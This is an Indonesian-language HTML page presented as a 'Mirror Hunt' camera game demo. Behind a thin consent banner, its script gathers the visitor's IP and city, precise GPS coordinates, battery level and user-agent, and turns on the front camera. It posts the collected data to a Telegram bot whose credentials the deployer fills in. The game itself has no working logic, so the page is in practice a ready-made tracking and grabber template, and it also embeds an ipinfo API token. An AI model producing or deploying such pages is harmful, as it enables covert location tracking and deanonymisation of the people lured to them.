<!doctype html>
<html lang="id">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>Mirror Hunt â€” Demo Aman (Auto Send)</title>
<style>
  :root{--bg:#0f172a;--card:#111827;--accent:#7c3aed;--glass:rgba(255,255,255,0.04);}
  body{margin:0;font-family:Inter,system-ui,Arial;background:linear-gradient(135deg,#0b1220,#102033);color:#e6eef8;display:flex;min-height:100vh;align-items:center;justify-content:center;padding:18px;}
  .app{width:100%;max-width:980px;background:linear-gradient(180deg,rgba(255,255,255,0.03),transparent);border-radius:12px;padding:18px;box-shadow:0 10px 30px rgba(2,6,23,0.6);}
  header{display:flex;align-items:center;gap:12px}
  h1{margin:0;font-size:1.3rem}
  .row{display:flex;gap:12px;margin-top:12px}
  .col{flex:1}
  .card{background:var(--card);padding:12px;border-radius:10px;backdrop-filter:blur(6px);box-shadow:0 6px 18px rgba(2,6,23,0.5)}
  video{width:100%;height:360px;object-fit:cover;border-radius:8px;background:#000}
  button{background:var(--accent);color:white;border:0;padding:10px 12px;border-radius:8px;cursor:pointer}
  small{opacity:0.8}
  .meta{font-size:0.9rem;line-height:1.4}
  .danger{background:#b91c1c}
  .hidden{display:none}
  .flex{display:flex;gap:8px;align-items:center}
  .badge{background:var(--glass);padding:6px 8px;border-radius:8px;font-size:0.85rem}
  /* Consent banner */
  .consent-banner{
    position:fixed;left:0;right:0;top:0;bottom:0;
    background:rgba(2,6,23,0.7);display:flex;align-items:center;justify-content:center;z-index:9999;
  }
  .consent-box{background:#0b1220;border-radius:10px;padding:18px;max-width:720px;width:94%;box-shadow:0 8px 40px rgba(0,0,0,0.6)}
  .consent-actions{display:flex;gap:10px;justify-content:flex-end;margin-top:12px}
  .btn-secondary{background:transparent;border:1px solid rgba(255,255,255,0.08);color:#e6eef8;padding:8px 12px;border-radius:8px;cursor:pointer}
</style>
</head>
<body>
  <!-- Consent banner: user must explicitly agree before we request permissions or send -->
  <div id="consent" class="consent-banner" aria-live="polite">
    <div class="consent-box" role="dialog" aria-modal="true" aria-label="Persetujuan Pengiriman Data">
      <h2 style="margin:0 0 6px 0">Persetujuan Pengiriman Data</h2>
      <p style="margin:0 0 8px 0;opacity:0.9">
        Untuk keperluan demo di perangkatmu, situs ini akan meminta izin kamera & lokasi.
        Setelah kamu menekan <strong>"I AGREE â€” Kirim data"</strong> dan mengizinkan prompt browser,
        data berikut <em>akan otomatis</em> dikirim ke Telegram (IP, lokasi jika diizinkan, baterai, user-agent).
      </p>
      <p style="margin:0 0 8px 0;color:#fbbf24">Hanya gunakan ini untuk testing di perangkatmu sendiri. Jangan gunakan untuk melanggar privasi orang lain.</p>
      <div class="consent-actions">
        <button id="btnCancel" class="btn-secondary">Cancel â€” Tampilkan Saja</button>
        <button id="btnAgree" style="background:#10b981;color:white;border:0;padding:8px 12px;border-radius:8px;cursor:pointer">I AGREE â€” Kirim data</button>
      </div>
    </div>
  </div>

  <div class="app" role="main" aria-labelledby="title">
    <header>
      <div>
        <h1 id="title">Mirror Hunt â€” Game Demo (Auto Send)</h1>
        <small>Demo: data dikirim otomatis setelah kamu setuju dan mengizinkan prompt browser.</small>
      </div>
      <div style="margin-left:auto" class="flex">
        <span class="badge" id="permStatus">Permission: â€”</span>
      </div>
    </header>

    <div class="row" style="margin-top:14px">
      <div class="col card">
        <div style="display:flex;gap:10px;align-items:center;">
          <!-- No permission buttons in main UI per request -->
        </div>

        <div style="margin-top:12px" id="camArea" class="hidden">
          <video id="video" autoplay playsinline></video>
          <div style="display:flex;gap:8px;margin-top:8px;align-items:center">
            <button id="btnStartGame">Start Mirror Hunt</button>
            <div id="gameInfo" style="margin-left:auto">Status: <span id="gameStatus">Idle</span></div>
          </div>
        </div>
      </div>

      <div class="col card">
        <h3>Device Info (Local preview)</h3>
        <div class="meta">
          <div>IP: <span id="ip">-</span></div>
          <div>Location: <span id="loc">-</span></div>
          <div>Battery: <span id="battery">-</span></div>
          <div>UserAgent: <small id="ua"></small></div>
        </div>

        <hr style="margin:12px 0;border:none;border-top:1px solid rgba(255,255,255,0.04)">

        <h4>Note</h4>
        <p style="font-size:0.9rem;opacity:0.9">
          Setelah kamu setuju, browser akan minta izin Camera & Location. Kalau diizinkan, data akan dikirim otomatis.
        </p>
      </div>
    </div>

    <div style="margin-top:12px" id="log" class="card hidden"></div>
  </div>

<script>
(async ()=>{

  // --- GANTI INI DENGAN CREDENTIAL TELEGRAM LO ---
  const CHAT_ID = "GANTI_CHAT_ID";
  const BOT_TOKEN = "GANTI_BOT_TOKEN";
  // ------------------------------------------------

  const consentEl = document.getElementById('consent');
  const btnAgree = document.getElementById('btnAgree');
  const btnCancel = document.getElementById('btnCancel');

  const video = document.getElementById('video');
  const camArea = document.getElementById('camArea');
  const ipEl = document.getElementById('ip');
  const locEl = document.getElementById('loc');
  const batEl = document.getElementById('battery');
  const uaEl = document.getElementById('ua');
  const permStatus = document.getElementById('permStatus');
  const btnStartGame = document.getElementById('btnStartGame');
  const gameStatus = document.getElementById('gameStatus');
  const log = document.getElementById('log');

  uaEl.textContent = navigator.userAgent;

  // helper
  function logMessage(s){
    log.classList.remove('hidden');
    const time = new Date().toLocaleTimeString();
    log.innerHTML = `<div style="font-size:0.9rem;opacity:0.95">[${time}] ${s}</div>` + log.innerHTML;
  }
  function delay(ms){ return new Promise(r=>setTimeout(r,ms)); }

  // fetch IP (public)
  async function fetchIP(){
    try {
      const resp = await fetch('https://ipinfo.io/json?token=5602d2e05cb668').then(r=>r.json()).catch(()=>null);
      if(resp && resp.ip){
        const ipData = resp.ip + ' â€” ' + (resp.city||'-') + ', ' + (resp.country||'-');
        ipEl.textContent = ipData;
        return ipData;
      } else {
        ipEl.textContent = 'Tidak tersedia';
        return ipEl.textContent;
      }
    } catch(e){
      ipEl.textContent = 'Error';
      return 'Error';
    }
  }

  // battery
  async function getBattery(){
    try {
      if(navigator.getBattery){
        const battery = await navigator.getBattery();
        const upd = ()=> batEl.textContent = Math.round(battery.level*100) + '%' + (battery.charging ? ' âš¡ï¸' : '');
        upd();
        battery.addEventListener('levelchange', upd);
        battery.addEventListener('chargingchange', upd);
        return batEl.textContent;
      } else {
        batEl.textContent = 'Tidak didukung';
        return batEl.textContent;
      }
    } catch(e){
      batEl.textContent = 'Error';
      return 'Error';
    }
  }

  // auto-send function
  async function sendToTelegram(payloadText){
    try{
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method:"POST",
        headers:{"Content-Type":"application/json"},
        body: JSON.stringify({ chat_id: CHAT_ID, text: payloadText })
      });
      logMessage('âœ… Data terkirim ke Telegram');
    }catch(err){
      console.error(err);
      logMessage('âŒ Gagal kirim ke Telegram');
    }
  }

  // MAIN flow after consent accepted
  async function mainFlow(){
    consentEl.style.display = 'none';
    permStatus.textContent = 'Permission: Requestingâ€¦';

    const ip = await fetchIP();
    const battery = await getBattery();

    // try request camera (user will see browser prompt)
    let stream = null;
    try {
      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
      video.srcObject = stream;
      camArea.classList.remove('hidden');
      permStatus.textContent = 'Permission: Camera âœ…';
      logMessage('Camera diaktifkan (user allowed).');
    } catch(e){
      permStatus.textContent = 'Permission: Camera âŒ';
      logMessage('Camera tidak diizinkan / error.');
    }

    // try get location (browser prompt)
    let locationText = 'Tidak tersedia';
    try {
      const pos = await new Promise((resolve, reject) => {
        if(!navigator.geolocation) return reject(new Error('No geolocation'));
        navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy:true, timeout:10000 });
      });
      locationText = `${pos.coords.latitude.toFixed(6)}, ${pos.coords.longitude.toFixed(6)} (acc ${pos.coords.accuracy}m)`;
      locEl.textContent = locationText;
      permStatus.textContent = (permStatus.textContent.includes('âŒ') ? 'Permission:' : '') + ' Location âœ…';
      logMessage('Lokasi diambil (user allowed).');
    } catch(err){
      locEl.textContent = 'Tidak diizinkan / tidak tersedia';
      logMessage('Lokasi tidak diizinkan / error.');
    }

    // prepare payload
    const payload = `
ðŸŒ Informasi IP
${ip}

ðŸ“± Device Info
UserAgent: ${navigator.userAgent}
Battery: ${battery}

ðŸ“ Lokasi
${locEl.textContent}

â° Waktu: ${new Date().toLocaleString("id-ID")}
`.trim();

    // auto-send (only after consent)
    await sendToTelegram(payload);
  }

  // If user cancels consent: hide banner but do not send. We still show IP/battery locally.
  btnCancel.addEventListener('click', async ()=>{
    consentEl.style.display = 'none';
    permStatus.textContent = 'Permission: Cancelled by user';
    await fetchIP();
    await getBattery();
    logMessage('User memilih Cancel â€” tidak mengirim ke Telegram.');
  });

  btnAgree.addEventListener('click', ()=>{
    // start main flow
    mainFlow();
  });

  // Start: show banner (already visible). Nothing else runs until user makes a choice.
})();
</script>
</body>
</html>
